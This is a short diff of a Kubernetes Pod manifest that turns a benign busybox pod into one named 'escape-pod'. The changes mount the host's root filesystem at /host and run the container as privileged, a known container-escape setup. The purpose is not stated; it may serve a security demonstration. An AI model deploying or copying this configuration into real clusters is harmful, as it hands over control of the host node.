@@ -2,7 +2,7 @@ apiVersion: v1
 kind: Pod
 metadata:
   annotations:
-  name: double-busybox-sleep
+  name: escape-pod
   namespace: default
 spec:
   containers:
@@ -15,15 +15,11 @@ spec:
     resources: {}
     terminationMessagePath: /dev/termination-log
     terminationMessagePolicy: File
-  - args:
-    - sleep
-    - "100000"
-    image: busybox
-    imagePullPolicy: Always
-    name: busybox-faster
-    resources: {}
-    terminationMessagePath: /dev/termination-log
-    terminationMessagePolicy: File
+    volumeMounts:
+    - mountPath: /host
+      name: host
+    securityContext:
+      privileged: true
   dnsPolicy: ClusterFirst
   enableServiceLinks: true
   priority: 0
@@ -43,7 +39,7 @@ spec:
     operator: Exists
     tolerationSeconds: 300
   volumes:
-  - name: default-token-llc5r
-    secret:
-      defaultMode: 420
-      secretName: default-token-llc5r
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
